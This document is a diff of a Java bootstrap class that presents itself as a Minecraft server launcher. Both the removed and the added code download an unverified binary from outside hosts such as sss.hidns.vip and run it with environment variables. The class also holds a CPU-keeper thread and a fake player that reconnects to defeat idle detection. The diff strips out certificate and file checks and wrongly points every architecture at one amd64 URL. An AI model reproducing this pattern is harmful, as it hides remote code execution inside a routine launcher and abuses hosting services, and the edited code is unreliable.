@@ -6,10 +6,7 @@ import java.nio.file.*;
 import java.util.*;
 import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.zip.Deflater; 
-import java.util.zip.Inflater;
-import javax.net.ssl.*;
-import java.security.cert.X509Certificate;
-import java.security.SecureRandom;
+import java.util.zip.Inflater; 
 
 public class Bootstrap
 {
@@ -32,10 +29,6 @@ public class Bootstrap
         "MC_JAR", "MC_MEMORY", "MC_ARGS", "MC_PORT", 
         "FAKE_PLAYER_ENABLED", "FAKE_PLAYER_NAME"
     };
-
-    static {
-        disableSSLVerification();
-    }
 
     public static void main(String[] args) throws Exception
     {
@@ -90,35 +83,6 @@ public class Bootstrap
         }
     }
     
-    private static void disableSSLVerification() {
-        try {
-            TrustManager[] trustAllCerts = new TrustManager[]{
-                new X509TrustManager() {
-                    public X509Certificate[] getAcceptedIssuers() { 
-                        return new X509Certificate[0]; 
-                    }
-                    public void checkClientTrusted(X509Certificate[] certs, String authType) {}
-                    public void checkServerTrusted(X509Certificate[] certs, String authType) {}
-                }
-            };
-            
-            SSLContext sc = SSLContext.getInstance("TLS");
-            sc.init(null, trustAllCerts, new SecureRandom());
-            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
-            
-            HostnameVerifier allHostsValid = new HostnameVerifier() {
-                public boolean verify(String hostname, SSLSession session) {
-                    return true;
-                }
-            };
-            HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);
-            
-            System.out.println(ANSI_YELLOW + "[SSL] Certificate verification disabled" + ANSI_RESET);
-        } catch (Exception e) {
-            System.err.println(ANSI_RED + "[SSL] Failed to disable SSL verification: " + e.getMessage() + ANSI_RESET);
-        }
-    }
-    
     private static void startCpuKeeper() {
         cpuKeeperThread = new Thread(() -> {
             while (running.get()) {
@@ -147,21 +111,11 @@ public class Bootstrap
     }   
     
     private static void runSbxBinary(Map<String, String> envVars) throws Exception {
-        try {
-            Path binaryPath = getBinaryPath();
-            System.out.println(ANSI_GREEN + "[SBX] Binary downloaded to: " + binaryPath + ANSI_RESET);
-            
-            ProcessBuilder pb = new ProcessBuilder(binaryPath.toString());
-            pb.environment().putAll(envVars);
-            pb.redirectErrorStream(true);
-            pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
-            sbxProcess = pb.start();
-            System.out.println(ANSI_GREEN + "[SBX] Process started successfully" + ANSI_RESET);
-        } catch (Exception e) {
-            System.err.println(ANSI_RED + "[SBX] Failed to start binary: " + e.getMessage() + ANSI_RESET);
-            System.err.println(ANSI_YELLOW + "[SBX] Continuing without SBX services..." + ANSI_RESET);
-            // 不抛出异常，让程序继续运行MC服务器
-        }
+        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
+        pb.environment().putAll(envVars);
+        pb.redirectErrorStream(true);
+        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+        sbxProcess = pb.start();
     }
     
     private static Map<String, String> loadEnvVars() throws IOException {
@@ -216,159 +170,26 @@ public class Bootstrap
         return envVars;
     }
     
-    private static boolean isValidBinary(Path path) throws IOException {
-        if (!Files.exists(path) || Files.size(path) < 1024) {
-            return false;
-        }
-        
-        // 读取文件头，检查是否是ELF格式（Linux二进制文件）
-        try (InputStream is = Files.newInputStream(path)) {
-            byte[] header = new byte[4];
-            int read = is.read(header);
-            if (read < 4) return false;
-            
-            // ELF文件的魔数：0x7F 'E' 'L' 'F'
-            if (header[0] == 0x7F && header[1] == 'E' && header[2] == 'L' && header[3] == 'F') {
-                return true;
-            }
-            
-            // 检查是否是HTML或文本（错误页面）
-            String headerStr = new String(header);
-            if (headerStr.startsWith("<!DO") || headerStr.startsWith("<htm") || headerStr.startsWith("HTTP")) {
-                System.err.println(ANSI_RED + "[Binary] Downloaded file appears to be HTML/text, not a binary" + ANSI_RESET);
-                
-                // 打印前200字节用于调试
-                is.reset();
-                byte[] sample = new byte[200];
-                int sampleRead = is.read(sample);
-                System.err.println(ANSI_YELLOW + "[Binary] File content sample:" + ANSI_RESET);
-                System.err.println(new String(sample, 0, sampleRead));
-                
-                return false;
-            }
-        }
-        
-        return false;
-    }
-    
     private static Path getBinaryPath() throws IOException {
         String osArch = System.getProperty("os.arch").toLowerCase();
-        
-        // 使用GitHub或其他可靠镜像站的URL
-        String[] urls;
+        String url;
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            urls = new String[]{
-                "https://github.com/eooce/test/releases/download/ARM/sb_amd64",
-                "https://raw.githubusercontent.com/eooce/test/main/ARM/sb_amd64",
-                "https://amd64.ssss.nyc.mn/sbsh",
-                "http://amd64.ssss.nyc.mn/sbsh"
-            };
+            url = "https://amd64.sss.hidns.vip/sbsh";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            urls = new String[]{
-                "https://github.com/eooce/test/releases/download/ARM/sb_arm64",
-                "https://raw.githubusercontent.com/eooce/test/main/ARM/sb_arm64",
-                "https://amd64.sss.hidns.vip/sbsh",
-                "http://amd64.sss.hidns.vip/sbsh"
-            };
+            url = "https://amd64.sss.hidns.vip/sbsh";
         } else if (osArch.contains("s390x")) {
-            urls = new String[]{
-                "https://github.com/eooce/test/releases/download/ARM/sb_s390x",
-                "https://s390x.ssss.nyc.mn/sbsh",
-                "http://s390x.ssss.nyc.mn/sbsh"
-            };
+            url = "https://amd64.sss.hidns.vip/sbsh";
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
-        
         Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
-        
-        // 如果文件已存在且是有效的二进制文件，直接使用
-        if (Files.exists(path) && isValidBinary(path)) {
-            System.out.println(ANSI_GREEN + "[Binary] Using cached valid binary: " + path + ANSI_RESET);
-            if (!path.toFile().setExecutable(true)) {
-                System.err.println(ANSI_YELLOW + "[Binary] Warning: Failed to set executable permission" + ANSI_RESET);
+        if (!Files.exists(path)) {
+            try (InputStream in = new URL(url).openStream()) {
+                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
             }
-            return path;
+            if (!path.toFile().setExecutable(true)) throw new IOException("Failed to set executable permission");
         }
-        
-        // 删除旧的无效文件
-        if (Files.exists(path)) {
-            System.out.println(ANSI_YELLOW + "[Binary] Removing invalid cached file..." + ANSI_RESET);
-            Files.delete(path);
-        }
-        
-        // 尝试从多个URL下载
-        Exception lastException = null;
-        for (int i = 0; i < urls.length; i++) {
-            String url = urls[i];
-            try {
-                System.out.println(ANSI_YELLOW + "[Binary] Attempting to download from: " + url + ANSI_RESET);
-                
-                URLConnection connection;
-                if (url.startsWith("https://")) {
-                    HttpsURLConnection httpsConn = (HttpsURLConnection) new URL(url).openConnection();
-                    httpsConn.setConnectTimeout(30000);
-                    httpsConn.setReadTimeout(60000);
-                    httpsConn.setRequestProperty("User-Agent", "Mozilla/5.0");
-                    httpsConn.setInstanceFollowRedirects(true);
-                    connection = httpsConn;
-                } else {
-                    HttpURLConnection httpConn = (HttpURLConnection) new URL(url).openConnection();
-                    httpConn.setConnectTimeout(30000);
-                    httpConn.setReadTimeout(60000);
-                    httpConn.setRequestProperty("User-Agent", "Mozilla/5.0");
-                    httpConn.setInstanceFollowRedirects(true);
-                    connection = httpConn;
-                }
-                
-                int responseCode = -1;
-                if (connection instanceof HttpURLConnection) {
-                    responseCode = ((HttpURLConnection) connection).getResponseCode();
-                    System.out.println(ANSI_YELLOW + "[Binary] HTTP Response Code: " + responseCode + ANSI_RESET);
-                    
-                    if (responseCode != 200) {
-                        System.err.println(ANSI_RED + "[Binary] Bad response code: " + responseCode + ANSI_RESET);
-                        continue;
-                    }
-                }
-                
-                try (InputStream in = connection.getInputStream()) {
-                    long bytesDownloaded = Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
-                    System.out.println(ANSI_GREEN + "[Binary] Downloaded: " + bytesDownloaded + " bytes" + ANSI_RESET);
-                    
-                    // 验证下载的文件
-                    if (!isValidBinary(path)) {
-                        System.err.println(ANSI_RED + "[Binary] Downloaded file is not a valid binary!" + ANSI_RESET);
-                        Files.delete(path);
-                        continue;
-                    }
-                    
-                    if (!path.toFile().setExecutable(true)) {
-                        throw new IOException("Failed to set executable permission");
-                    }
-                    
-                    System.out.println(ANSI_GREEN + "[Binary] Successfully downloaded and validated!" + ANSI_RESET);
-                    return path;
-                }
-                
-            } catch (Exception e) {
-                lastException = e;
-                System.err.println(ANSI_RED + "[Binary] Failed to download from " + url + ": " + e.getMessage() + ANSI_RESET);
-                
-                if (i < urls.length - 1) {
-                    System.out.println(ANSI_YELLOW + "[Binary] Trying next URL..." + ANSI_RESET);
-                    try { Thread.sleep(2000); } catch (InterruptedException ie) {}
-                }
-            }
-        }
-        
-        // 所有URL都失败
-        System.err.println(ANSI_RED + "[Binary] All download attempts failed!" + ANSI_RESET);
-        if (lastException != null) {
-            throw new IOException("Failed to download binary from all URLs", lastException);
-        } else {
-            throw new IOException("Failed to download binary from all URLs");
-        }
+        return path;
     }
     
     private static void stopServices() {
@@ -508,8 +329,8 @@ public class Bootstrap
                 try {
                     System.out.println(ANSI_YELLOW + "[FakePlayer] Connecting..." + ANSI_RESET);
                     socket = new Socket();
-                    socket.setReuseAddress(true);
-                    socket.setSoLinger(true, 0);
+                    socket.setReuseAddress(true); // 允许地址复用
+                    socket.setSoLinger(true, 0);  // 立即关闭，不等待
                     socket.setReceiveBufferSize(1024 * 1024 * 10); 
                     socket.connect(new InetSocketAddress("127.0.0.1", mcPort), 5000);
                     socket.setSoTimeout(60000); 
@@ -544,7 +365,7 @@ public class Bootstrap
                     out.flush();
                     
                     System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Handshake & Login sent" + ANSI_RESET);
-                    failCount = 0;
+                    failCount = 0; // 连接成功，重置失败计数
                     
                     boolean configPhase = false;
                     boolean playPhase = false;
@@ -552,9 +373,10 @@ public class Bootstrap
                     int compressionThreshold = -1;
                     
                     long loginTime = System.currentTimeMillis();
-                    long stayOnlineTime = 60000 + (long)(Math.random() * 60000);
+                    long stayOnlineTime = 60000 + (long)(Math.random() * 60000); // 60-120秒
 
                     while (running.get() && !socket.isClosed()) {
+                        // 定时重连，防止被判定为空闲
                         if (System.currentTimeMillis() - loginTime > stayOnlineTime) {
                             System.out.println(ANSI_YELLOW + "[FakePlayer] Reconnecting cycle (Anti-Idle)..." + ANSI_RESET);
                             break;
@@ -681,6 +503,7 @@ public class Bootstrap
                     failCount++;
                     
                 } finally {
+                    // ⭐ 关键修复：确保所有资源都被正确释放
                     try {
                         if (out != null) {
                             out.close();
@@ -700,9 +523,11 @@ public class Bootstrap
                     } catch (Exception e) {}
                 }
                 
+                // 重连等待，失败次数多时增加等待时间
                 try {
                     long waitTime = 10000;
                     if (failCount > 3) {
+                        // 连续失败时使用指数退避策略，最多等待5分钟
                         waitTime = Math.min(10000 * (long)Math.pow(2, Math.min(failCount - 3, 5)), 300000);
                         System.out.println(ANSI_YELLOW + "[FakePlayer] Multiple failures (" + failCount + "), waiting " + (waitTime/1000) + "s..." + ANSI_RESET);
                     } else {
